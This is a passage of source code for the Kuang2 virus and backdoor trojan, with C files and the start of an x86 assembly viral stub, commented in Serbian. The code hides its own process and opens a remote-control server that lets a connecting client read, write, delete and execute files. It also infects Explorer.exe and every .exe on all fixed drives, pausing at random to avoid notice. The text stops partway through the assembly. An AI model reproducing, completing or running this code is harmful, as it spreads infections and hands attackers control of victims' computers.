ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[fmain.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
								 KUANG2: server
								   ver: 0.21
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// >>>>> RELEASE VERSION: 0.21 (26-may-1999) <<<<<
// ver 0.21 (26-may-1999): mali bug je ispravljen
// >>>>> RELEASE VERSION: 0.20 (22-may-1999) <<<<<
// ver 0.20 (14-may-1999): razna sre”ivanja
// ver 0.10 (30-mar-1999): born code

#include <windows.h>
#include <winsock.h>
#include <win95e.h>
#include <ctypew.h>
#include <strmem.h>
#include <tools.h>
#include "kuang2.h"

#pragma aux Wmain "_*"

extern void OnAccept(SOCKET);
extern void OnQuitclient(SOCKET);

HWND hWnd;

char Kuang2_class[MAX_COMPUTERNAME_LENGTH+2];
char temppath[MAX_PATH];
DWORD drives;
char *addfile;				// fajl za dodavanje

extern DWORD WINAPI InfectThread(LPVOID );
DWORD InfectThreadID;


/*
	MessageLoop
	-----------
  ş obrada poruka prozora. */

LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
		// inicijalizacija programa
		case WM_CREATE:
			hWnd=hwnd;
			drives=GetDrives(DRIVE_FIXED);
			CreateThread(NULL, 0, InfectThread, NULL, 0, &InfectThreadID);
			break;

		// asinhrono obave„tavanje
		case UM_ASYNC:
			if (WSAGETSELECTEVENT(lParam)==FD_ACCEPT)
				OnAccept((SOCKET)wParam);
			break;

		// jedan od klijenata je zavr„io rad
		case UM_QUITCLIENT:
			OnQuitclient((SOCKET)wParam);
			break;

		// kraj programa
		case WM_DESTROY:
			PostQuitMessage(0);
			break;

		default:
			return (DefWindowProc(hwnd, msg, wParam, lParam));
	}
	return 0;
}


/*
	InitApp
	-------
  ş Inicijalizacija aplikacije. Registracija windows klasu za aplikaciju. */

BOOL InitApp(HINSTANCE hInst)
{
	WNDCLASSEX wc;
	HWND hwnd;

	// parametri klase
	wc.cbSize		 = sizeof(WNDCLASSEX);		// veliina strukture
	wc.style		 = 0;						// nema stilova klase
	wc.lpfnWndProc	 = (WNDPROC) MsgLoop;		// message loop procedura
	wc.cbClsExtra	 = 0;						// nema etxra data po klasi
	wc.cbWndExtra	 = 0;						// nema extra data po prozoru
	wc.hInstance	 = hInst;					// ko poseduje ovu klasu (owner)
	wc.hIcon		 = NULL;					// nema ikona (RC)
	wc.hCursor		 = NULL;					// nema kurzora (RC)
	wc.hbrBackground = NULL;					// nema default boja
	wc.lpszMenuName	 = NULL;					// nema meni (RC)
	wc.lpszClassName = Kuang2_class;			// ime za registraciju
	wc.hIconSm		 = NULL;					// nema male ikona

	// registracija klase
	if (!RegisterClassEx(&wc)) {
		if (!RegisterClass((LPWNDCLASS)&wc.style))		// mo‚da je NT u pitanju
			return FALSE;								// neupsela registracija
	}

	hwnd = CreateWindow(			// kreiramo glavni prozor aplikacije
			Kuang2_class,			// ime registrovane klase
			NULL,					// text prozora
			0,						// windows stil
			-1, -1,					// pozicija bogu iza le”a
			0, 0,					// veliina 0
			NULL,					// prethodni hwnd
			NULL,					// handle za meni ili child-prozor
			hInst,					// ova instanca poseduje (own) prozor
			NULL					// Don't need data in WM_CREATE
	);

	if (!hwnd) return FALSE;	// gre„ka?

	ShowWindow(hwnd, SW_HIDE);	// sakrij prozor
	return TRUE;				// sve je pro„lo ok.
}


/*
	WinMain
	--------
  ş Virus koji je zakaen na fajlove ekstrakuje i startuje ovog trojanca. */

int Wmain()
{
	HWND hThisInst;				// handle na program
	MSG msg;					// poruke
	char *CmdLine;				// komandna linija sa putanjom i imenom fajla
	unsigned int i;

	// inicijalizacija
	hThisInst=GetModuleHandle(NULL);

	// uzimanje komandne linije i osloba”anje od navodnika
	CmdLine=GetCommandLine();
	i=0;
	if (CmdLine[0]=='"') {                          // u najve†em broju sluajeva
		CmdLine++;									// navodnici postoje i njihovim
		while(CmdLine[i] && CmdLine[i]!='"') i++;   // skidanjem automatski se uklanjaju
		CmdLine[i]=0;								// i svi argumenti!
	}

	// to je ujedno i fajl za dodavanje!
	addfile=CmdLine;

	// formiranje jedinstvenog imena klase
	i=MAX_COMPUTERNAME_LENGTH+1;
	GetComputerName(Kuang2_class, (LPDWORD)&i);
	strcopyF(temppath, "Krnl386#class");

	if (strlengthF(Kuang2_class)>3) {
		temppath[4]=_to_lower(Kuang2_class[1]);
		temppath[5]=_to_lower(Kuang2_class[0]);
		temppath[6]=_to_lower(Kuang2_class[2]);
	}
	strcopyF(Kuang2_class, temppath);

	// ako je Kuang2 ve† aktivan iza”i
	if (FindWindow(Kuang2_class, NULL)) return 1;

	// preuzmi temp folder
	if (GetTempPath(MAX_PATH, temppath)==0)
		strcopyF(temppath, "c:\\");

	// skrivanje procesa
	HideProcess(TRUE);

	// inicijalizacija celog programa
	if (!InitApp(hThisInst)) return 3;

	// message loop
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// izlaz
	WSACleanup();
	DestroyWindow(hWnd);
	return msg.wParam;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[fmain.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kserver.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
								 KUANG2: server
								   ver: 0.15
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.15 (06-may-1999): konaan oblik
// ver 0.10 (30-mar-1999): born code

#include <windows.h>
#include <winsock.h>
#include <win95e.h>
#include <strmem.h>
#include "kuang2.h"

extern HWND hWnd;
extern char Kuang2_class[];
extern DWORD drives;

DWORD WINAPI ServerThread (LPVOID);

extern char temppath[];
SOCKET listen_socket;

/*
	StartServer
	-----------
  ş Poetak rada servera. Kreira se socket, postavlja se asinhrono
	obave„tavanje i ukljuuje se listen mod */

int StartServer(void)
{
	WSADATA W;
	SOCKADDR_IN sa_server;

	// zahteva se winsock v1.1
	if (WSAStartup (0x101, &W)) return 2;

	// obri„i request listu
	ClearRequests();

	// kreiraj stream socket
	listen_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (listen_socket==INVALID_SOCKET) return 1;

	// postavi asinhrono obave„tavanje
	if (WSAAsyncSelect(listen_socket, hWnd, UM_ASYNC, FD_ACCEPT) == INVALID_SOCKET) {
		closesocket(listen_socket);
		return 2;
	}

	// popuni strukturu
	sa_server.sin_family=AF_INET;			// Internet familija
	sa_server.sin_addr.s_addr=INADDR_ANY;	// sve adrese
	sa_server.sin_port=htons(KUANG2_PORT);	// port

	// bindovanje
	if (bind(listen_socket, (struct sockaddr*)&sa_server, sizeof(sa_server)) == SOCKET_ERROR) {
		closesocket(listen_socket);
		return 3;
	}

	// namesti socket u listen mod
	if (listen(listen_socket, MAXCONN) == SOCKET_ERROR) {
		closesocket(listen_socket);
		return 4;
	}

	return 0;
}

/*
	OnAccept
	--------
  ş dobijena je asinhrona poruka za prijem konekcije */

void OnAccept(SOCKET socket)
{
	SOCKADDR_IN sock_addr;
	SOCKET peer_socket;
	DWORD ThreadID;
	int nlen;

	// prihvata se konekcija
	nlen=sizeof(sock_addr);
	peer_socket=accept(listen_socket, (struct sockaddr*)&sock_addr, &nlen);
	if (peer_socket==SOCKET_ERROR) return;

	// preuzmi novi request
	nlen=NewRequest();
	if (nlen==NOMOREREQUEST) {			// ima previ„e konektovanih klijenata
		unsigned int err=K2_ERROR;
		send(peer_socket, (char *) &err, 4, 0);
		closesocket(peer_socket);
		return;
	}

	// zapamti socket
	request[nlen].socket=peer_socket;

	// startuj thread i zapamti handle na njega
	request[nlen].thread=CreateThread(NULL, 0, ServerThread, (LPVOID) &(request[nlen].socket), 0, &ThreadID);

	return;
}


/*
	OnQuitclient
	------------
  ş dobijena je poruka za zavr„avanje klijenta */

void OnQuitclient(SOCKET socket)
{
	int i;

	// preuzmi index u Request listi trenutne konekcije
	i=GetRequest(socket);
	if (i==BADREQUEST) return;

	// zatvori socket
	closesocket(socket);

	// zatvori thread
	CloseHandle(request[i].thread);

	// obri„i zauzeto polje u Request listi
	request[i].socket=-1;

	return;
}


/*
	ServerThread
	------------
  ş Svaka konekcija koja se zakai na server koristi ovaj thread. */

DWORD WINAPI ServerThread (LPVOID targ)
{
	char buffer[BUFFER_SIZE];
	pMessage k2_msg = (pMessage) buffer;
	SOCKET msgsock=*(SOCKET*)targ;
	DWORD temp;
	unsigned int bytes_recieved;
#define		bytes_sent		bytes_recieved
	unsigned int fajlsize, tosend;
#define		downloaded		tosend
	HANDLE fajl;
	char filelist[MAX_PATH+1];

	fajlsize=0;
	// ovo je kulturan server - „alje pozdravnu poruku pri konekciji
	k2_msg->command=K2_HELO;					// komanda prepoznavanja
	k2_msg->param=drives;						// informacije o fixnim diskovima
	temp=BUFFER_SIZE-8;
	GetComputerName(&(k2_msg->sdata), &temp);	// ime kompjutera na kome je server
	send(msgsock, buffer, BUFFER_SIZE, 0);

	// petlja servera: prima poruke klijenta i odgovara na njih
	while (1) {

		// primi poruku
		bytes_recieved=recv(msgsock, buffer, BUFFER_SIZE, 0);	// prihvati poruku od klijenta
		if (!bytes_recieved) k2_msg->command=K2_QUIT;			// ako je klijent oti„ao
		if ((bytes_recieved==SOCKET_ERROR)) {					// ako je nastupila gre„ka
			if (WSAGetLastError()!=WSAEWOULDBLOCK) k2_msg->command=K2_QUIT; // i to fatalna
				else continue;									// ne fatalna gre„ka - wsaewouldblock
		}

		// parse commands
		switch (k2_msg->command) {

			case K2_DOWNLOAD_FILE:
				// faza #3 - zatvori handle i javi da je OK
				if (k2_msg->param==3) {
					CloseHandle(fajl);
					fajlsize=0;
					k2_msg->command=K2_DONE;
					send(msgsock, buffer, 4, 0);
					break;
				}
				// faza #2 - zapoinje burst prenos fajla
				if (k2_msg->param==2) {
					while (fajlsize) {
						tosend=BUFFER_SIZE;
						if (tosend>fajlsize) tosend=fajlsize;
						SetFilePointer(fajl, -fajlsize, NULL, FILE_END);
						ReadFile(fajl, buffer, tosend, &temp, NULL);
						bytes_sent=send(msgsock, buffer, tosend, 0);	// po„alji 1KB fajla
						if (bytes_sent==SOCKET_ERROR) {
							if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
								else bytes_sent=0;
						}
						fajlsize-=(bytes_sent);
					}
					break;
				}
				// faza #1 - inicijalizacija downloada
				fajl=CreateFile(k2_msg->bdata, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
				fajlsize=GetFileSize(fajl, NULL);
				if ((fajlsize==0xFFFFFFFF) || (fajl==INVALID_HANDLE_VALUE)) {
					k2_msg->command=K2_ERROR;		// neka gre„ka pri radu sa fajlom
					send(msgsock, buffer, 4, 0);
					break;
				}
				k2_msg->command=K2_DONE;			// fajl spreman za download
				k2_msg->param=fajlsize;				// veliina fajla
				send(msgsock, buffer, 8, 0);
				break;


			case K2_QUIT:
				SendMessage(hWnd, UM_QUITCLIENT, (WPARAM) msgsock, 0);
				return 0;


			case K2_DELETE_FILE:
				if (DeleteFile(k2_msg->bdata)) k2_msg->command=K2_DONE;
					else k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				break;


			case K2_RUN_FILE: {
				STARTUPINFO si;
				PROCESS_INFORMATION pi;

				si.cb=sizeof(STARTUPINFO);
				si.cbReserved2=0;
				si.lpReserved=si.lpReserved2=NULL;
				si.lpTitle=si.lpDesktop=(LPTSTR)NULL;
				si.dwFlags=STARTF_FORCEOFFFEEDBACK;
				if (CreateProcess(NULL, k2_msg->bdata, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &si, &pi)) {
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
					k2_msg->command=K2_DONE;
				} else k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				}
				break;


			case K2_FOLDER_INFO: {
				WIN32_FIND_DATA FileData;
				HANDLE hSearch;
				BOOL fFinished=FALSE;

				// prvo kreira jedinstveno ime fajla za prenos FOLDER_LIST
				GetTempFileName(temppath, Kuang2_class, 0, filelist);

				fajl=CreateFile(filelist, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
				hSearch=FindFirstFile(k2_msg->bdata, &FileData);	// tra‚i...
				if ((fajl==INVALID_HANDLE_VALUE) || (hSearch==INVALID_HANDLE_VALUE)) {	// ako ne na”e prvi fajl ili fajl nije otvoren
					k2_msg->command=K2_ERROR;
					CloseHandle(fajl); DeleteFile(filelist);
					send(msgsock, buffer, 4, 0);
					break;
				}

				while (!fFinished) {	// vrti za sve fajlove, 'buffer' je slobodan

					if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						wsprintf(buffer, "*%s", FileData.cFileName);
					else {
						temp=FileData.nFileSizeLow >> 10;		// veliina fajla u KB
						if (FileData.nFileSizeLow) temp++;		// da 0 fajl bude zaista 0
						if (FileData.nFileSizeHigh) temp=-1;	// ako je fajl jako veliki
						wsprintf(buffer, "%s <%1luk>", FileData.cFileName, temp);
					}

					// upi„i string u fajl, zajedno sa NULL terminatorom na kraju
					WriteFile(fajl, buffer, strlengthF(buffer)+1, &temp, NULL);

					// uzima slede†i fajl
					if (!FindNextFile(hSearch, &FileData)) {
						if (GetLastError()==ERROR_NO_MORE_FILES) {	// do„li smo na kraj - nema vi„e fajlova
							k2_msg->command=K2_DONE;				// po„alji oznaku za kraj
							strcopyF(k2_msg->bdata, filelist);		// i ime fajla za download
						} else k2_msg->command=K2_ERROR;			// nastupila je gre„ka

						FindClose(hSearch);		// zatvori pretragu
						CloseHandle(fajl);		// zatvori fajl
						if (k2_msg->command==K2_ERROR) DeleteFile(filelist);
						send(msgsock, buffer, BUFFER_SIZE, 0);
						fFinished=TRUE;
					}
				}
				}
				break;


			case K2_UPLOAD_FILE:
				// faza #1
				fajlsize=k2_msg->param;
				fajl=CreateFile(k2_msg->sdata, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
				if (fajl==INVALID_HANDLE_VALUE) {
					k2_msg->command=K2_ERROR;		// nastupila je gre„ka
					send(msgsock, buffer, 4, 0);
					break;
				}
				k2_msg->command=K2_DONE;			// sve je ok.
				send(msgsock, buffer, 4, 0);

				// faza #2
				downloaded=0;
				while (downloaded!=fajlsize) {
					bytes_recieved=recv(msgsock, buffer, BUFFER_SIZE, 0);	// primi deo fajla
					if (bytes_recieved==SOCKET_ERROR) {
						if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
						bytes_recieved=0;
						continue;
					}
					WriteFile(fajl, buffer, bytes_recieved, &temp, NULL);
					downloaded+=bytes_recieved;
				}

				// faza #3
				k2_msg->command=K2_DONE;			// sve je ok.
				send(msgsock, buffer, 4, 0);
				CloseHandle(fajl);
				break;


			default:
				k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				break;
		}
	}

	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kserver.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[krequest.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
								KUANG2: request
								   ver: 0.10
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.10 (28-apr-1999): born code

#include <windows.h>
#include <winsock.h>
#include "kuang2.h"

// Kod velikih servera Request lista bi trebalo da se dobija dinamiki, tj.
// da se memorija odvaja pri svakom dodavanju. Po„to ovo nije veliki server
// ve† mali, Request lista se mo‚e i ovako napraviti.
REQUEST request[MAXCONN];

/*
	ClearRequests
	-------------
  ş Bri„e celu request listu. */

void ClearRequests(void)
{
	int i;

	for (i=0; i<MAXCONN; i++) request[i].socket=-1;

	return;
}


/*
	NewRequest
	----------
  ş Pretrazuje Request listu za slobodnim mestom i vra†a njegov index.
  ş Vra†a -2 ako nema slobonih mesta. */

int NewRequest(void)
{
	unsigned int i;

	for (i=0; i<MAXCONN; i++)
		if (request[i].socket==-1) return i;

	return NOMOREREQUEST;
}

/*
	GetRequest
	----------
  ş Pretrazuje Request listu i vra†a index kada se poklope socketi.
  ş Vra†a -3 ako nema slobonih mesta. */

int GetRequest(SOCKET s)
{
	unsigned int i;

	for (i=0; i<MAXCONN; i++)
		if (request[i].socket==s) return i;

	return BADREQUEST;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[krequest.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kinfect.c]ÄÄÄ
/***[ThuNderSoft]*************************************************************
							 KUANG2: infect thread
								   ver: 0.14
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.14 (26-may-1999): test mode
// ver 0.13 (21-may-1999): kada ne mo‚e explorer.exe onda ceo c:\windows!
// ver 0.12 (14-may-1999): born code
// ver 0.10 (11-may-1999): born code

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// ako je definisan TESTMODE onda se formira fajl u rutu C diska koji
// sadr‚i informacije o svakom inficiranom fajlu
//#define TESTMODE

// ako je definisan SKIP_C_DISK onda se C disk preskae prilikom inficiranja
//#define SKIP_C_DISK





#ifdef TESTMODE
DWORD written;
HANDLE testfile;
#endif


// maximalna dozvoljena dubina rekurzije
#define		MAX_DEEP		12

extern int IsFileInfect(char *, char*);
extern int InfectFile(char *);

extern HWND hWnd;
extern char Kuang2_class[];
extern DWORD drives;
char *fn;
char _bf[]="..";
char exty[]="w";

unsigned int filescount, deep;
BOOL	INFECT_ALL;

// potpis fajla
extern char kript;
char *signature=&kript+1;



/*
	InfectFolder
	------------
  ş Inficira ceo folder sa svi subfolderima.
  ş rekurzija, ali do odre”ene granice.
  ş brzina zaraze: proseno oko 21 sekundu za 10 fajlova. */

void InfectFolder(char *folder) {
	WIN32_FIND_DATA FileData;
	HANDLE hSearch;
	char path[MAX_PATH];
	unsigned int ix;

	// dubina rekurzije
	deep++;
	if (deep>MAX_DEEP) {deep--; return;}

	// zaponi pretragu foldera
	strcopyF(path, folder);
	setfilename(path, "*.*");
	hSearch=FindFirstFile(path, &FileData);
	if (hSearch==INVALID_HANDLE_VALUE) return;

	// vrti sve fajlove u folderu
	do {
		setfilename(path, FileData.cFileName);		// uzmi ime trenutnog fajla

		if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (INFECT_ALL==FALSE) continue;	// ako ne inficira„ sve podfoldere idi dalje
			fn=getfilename(path);
			if (!lstrcmp(fn, &_bf[1]) || !lstrcmp(fn, _bf)) continue;	// ako je '.' ili '..'
			ix=strlengthF(path);
			path[ix]='\\'; path[ix+1]=0;        // dodaj '/'
#ifdef TESTMODE
			WriteFile(testfile, path, strlengthF(path), &written, NULL);
			WriteFile(testfile, "\r\n", 2, &written, NULL);
#endif
			InfectFolder(path);					// rekurzija!
#ifdef TESTMODE
			WriteFile(testfile, "<OK>\r\n", 6, &written, NULL);
#endif
			path[ix]=0;							// obri„i '/'
		} else {
			fn=getfileext(path);					// uzmi extenziju
			if (fn==NULL) continue;					// ako ext ne postoji iza”i
			if (!lstrcmpi(fn, "exe")) {             // da li je .exe?
				filescount++;
				if (!IsFileInfect(path, signature)) {	// ako fajl nije inficiran....
					/* INFICIRAJ! */
#ifdef TESTMODE
					WriteFile(testfile, path, strlengthF(path), &written, NULL);
#endif
					InfectFile(path);
#ifdef TESTMODE
					WriteFile(testfile, " [OK]\r\n", 7, &written, NULL);
#endif
				}
				// ako je pregledano 10 fajlova, odspavaj malo
				// da ne bi bila sumljiva 'trka' po disku
				if (filescount==10) {
					filescount=0;
#ifndef TESTMODE
					if (INFECT_ALL==TRUE) {				// ako inficira„ sve foldere
						ix=GetTickCount() & 0x0F;		// sluajan broj od 0-15
						Sleep((ix+13)*1000);			// spavaj od 13sec-28sec
					}
#endif
				}
			}
		}
	} while (FindNextFile(hSearch, &FileData));

	// zavr„i sa pretragom
	FindClose(hSearch);
	deep--;
	return;
}


extern int StartServer(void);


/*
	InfectThread
	------------
  ş Thread koji zara‚ava ceo sistem. */

DWORD WINAPI InfectThread (LPVOID _d)
{
#ifndef TESTMODE
	char explorer[MAX_PATH];
	char ttemp[MAX_PATH];
	char wininit[MAX_PATH];
#endif
	DWORD drvs=drives;
	char root[]="a:\\";

	*signature=0x4C;		// ispravi signature
	INFECT_ALL=TRUE;		// inficiraj sve foldere!
	Sleep(3000);			// prvo spavaj 3 sekunde

#ifndef TESTMODE

	/* FAZA #1 - inficiranje Explorer.exe */

	GetWindowsDirectory(explorer, MAX_PATH);
	strcopyF(wininit, explorer);
	straddF(explorer, "\\Explorer.exe");        // napravi string sa Explorer.exe
	straddF(wininit, "\\wininit.ini");          // napravi string sa Winit.exe
	switch (IsFileInfect(explorer, signature))	// da li je explorer.exe zara‚en?
	{
		case 0:			// NIJE INFICIRAN
			strcopyF(ttemp, explorer);
			exty[0]=Kuang2_class[4];				// jedinstvena extenzija
			setfileext(ttemp, exty);				// napravi string za kopiju Exlorer.exe
			CopyFile(explorer, ttemp, FALSE);		// kopiraj Explorer.exe, uvek!
			if (!InfectFile(ttemp)) {				// ako je uspe„no inficiran...
				WritePrivateProfileString("Rename", explorer, ttemp, wininit);   // napravi 'wininit.ini' :)
			} else {								// a ako nije uspe„no inficiran
				DeleteFile(ttemp);					// obri„i kopirani fajl
				deep=strlengthF(explorer)-12;
				explorer[deep]=0;					// na”i Windows folder
				INFECT_ALL=FALSE;					// i samo njega
				InfectFolder(explorer);				// inficiraj
			}
			break;		// nastavi dalje!
		case -1:		// GREKA KOD ODRE™IVANJA DA LI JE INFICIRAN (?)
			SendMessage(hWnd, WM_DESTROY, 0, 0);	// zavr„ava posao
			return 0;	// iza”i
	}

#else
	MsgBox("Kuang2 theVirus *TEST* mode.");
	testfile=CreateFile("c:\\k2test.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
#endif


	/* FAZA #2 - inficiranje celog sistema */

	// prvo startuj server, po„to se virus ne startuje prvi put
	// (tj. explorer.exe je zara‚en)
	StartServer();

	// spavaj 10 sekundi
	Sleep(10000);

	// inficiraj ceo sistem
	filescount=0;			// broja fajlova
	while (drvs) {
		deep=0;
#ifdef SKIP_C_DISK
		if (root[0]=='c') {
			root[0]++;
			drvs=drvs>>1;
			continue;
		}
#endif
		if (drvs & 1) InfectFolder(root);
		drvs=drvs>>1;
		root[0]++;
	}

#ifdef TESTMODE
	MsgBox("THE END");
	CloseHandle(testfile);
	SendMessage(hWnd, WM_DESTROY, 0, 0);
#endif

	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kinfect.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[weirdus.asm]ÄÄÄ
;***[ThuNderSoft]*************************************************************
;								KUANG2: weirdus
;								   ver: 0.21
;								úùÄÍ WEIRD ÍÄùú
;*****************************************************************************

;* HISTORY *
; ver 0.21 (18-may-1999): jo„ smanjenja (cmpname)
; ver 0.20 (08-mar-1999): standardni oblik radi
; ver 0.10 (29-jan-1999): born code

.387
.386p

;**	  weirdus
;**	  -------
;** ş Ovde se nalazi kod virusa koji se kai na EXE fajlove
;** ş Ceo je u DATA segmentu jer nam je lak„e da mu pristupamo iz Watcoma.
;**	  Moglo je da bude i u CODE segmentu - tada bi morali da koristimo
;**	  program PEWRSEC, ali dobija se isto
;** ş Obrati pa‚nju: program ne sme da bude vezan direktno za bilo „ta -
;**	  sve mora da se radi preko ofseta
;** ş Zbog baga asemblera? ne mo‚e da radi 'mov eax, [ebp + ofs1 - ofs2] (16 bitno?)
;**	  Zato moramo da koristimo apsolutnu dodelu.
;** ş Trenutna veliina: 999 bajta


include weirdus.inc


_DATA segment dword public use32 'DATA'
assume ds:_DATA, ss:_DATA

PUBLIC _virus_start, _virus_end
PUBLIC _oldEntryPoint, _oldEntryPointRVA, _oldEPoffs, _oldfilesize
PUBLIC _oldoffs1, _olddata1, _oldoffs2, _olddata2, _oldoffs3, _olddata3, _oldoffs4, _olddata4, _oldoffs5, _olddata5
PUBLIC _ddGetModuleHandleA, _ddGetProcAddress
PUBLIC _addfile_size, _kript


;*******************
;*** Kod sekcija ***
;*******************

_virus_start:
		push eax				; sauvaj mesto za povratnu adresu (ka hostu)
		pushad
		call letsgo

letsgo:
		pop ebp					; pokupi IP (instruction pointer) od call-a
		add ebp, _data_start - letsgo	; ebp sada pokazuje na podatke (_data_start)

x = _OldEntryPoint - _data_start
		mov eax, cs:[ebp+x]		; pokupi host EntryPoint
		mov [esp+32], eax		; namesti oldEntrypoint hosta u stek


;***********************
;*** Inicijalizacija ***
;***********************

;prvo dekriptuj stringove f-ja
x = strKernel - _data_start
		lea eax, [ebp+x]
@@:		cmp byte ptr [eax], 0
		je @f					; ako smo na kraju, skoi
		dec byte ptr [eax]
		inc eax
		jmp @b					; vrti petlju
@@:

; esi = GetModuleHandleA(KERNEL32.DLL)
x = strKernel - _data_start
		lea eax, [ebp + x]
		push eax				; Arg0 = LPCTSTR lpModuleName
x = _ddGetModuleHandleA - _data_start
		mov eax, cs:[ebp + x]
		call dword ptr [eax]	; call GetModuleHandleA
		test eax, eax
		jz virus_exit			; ako je nastala gre„ka, skoi
		mov esi, eax			; esi = HMODULE (KERNEL32.DLL)


; GetProcAddress
x = _ddGetProcAddress - _data_start
		mov eax, cs:[ebp+x]		; prvo proveri da li je GetProcAddress
		test eax, eax			; uvezena u ovom exe fajlu
		jnz @f					; da, sve je u redu, idi dalje
								; ne, ajd sad da probamo sami da na”emo

; Sam na”i adresu GetProcAddress ako mo‚e„
x = strGetProcAddress - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
		call near ptr WinGetProcAddress
		test eax, eax			; da li je f-ja na”ena?
		jz virus_exit			; nije, skoi
x = ddGetProcAddress - _data_start
		lea ebx, cs:[ebp+x]
		mov [ebx], eax			; zapamti adresu f-je
		mov [ebx-4], ebx		; i pointer na adresu


;*******************************
;*** Na”i adrese WinAPI f-ja ***
;*******************************
; u cilju smanjenja koda obavezan je ovaj redosled f-ja!

@@:
; GetProcAddress (GetWindowsDirectoryA)
x = strGetWindowsDirectoryA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
x = ddGetWindowsDirectoryA - _data_start
		lea edi, cs:[ebp+x]
		mov [edi], eax			; zapamti adresu f-je

; GetProcAddress (GetComputerNameA)
x = strGetComputerNameA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+4], eax		; zapamti adresu f-je

; GetProcAddress (CreateFileA)
x = strCreateFileA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+8], eax		; zapamti adresu f-je

; GetProcAddress (WriteFile)
x = strWriteFile - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+12], eax		; zapamti adresu f-je

; GetProcAddress (CloseHandle)
x = strCloseHandle - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+16], eax		; zapamti adresu f-je

; GetProcAddress (CreateProcessA)
x = strCreateProcessA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+20], eax		; zapamti adresu f-je


;*******************************
;*** Priprema stringova itd. ***
;*******************************

; GetWindowsDirectoryA
		push dword ptr 256		; Arg1 = UINT Size
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi]	; call GetWindowsDirectoryA

; GetComputerNameA
x = cmpname_len - _data_start
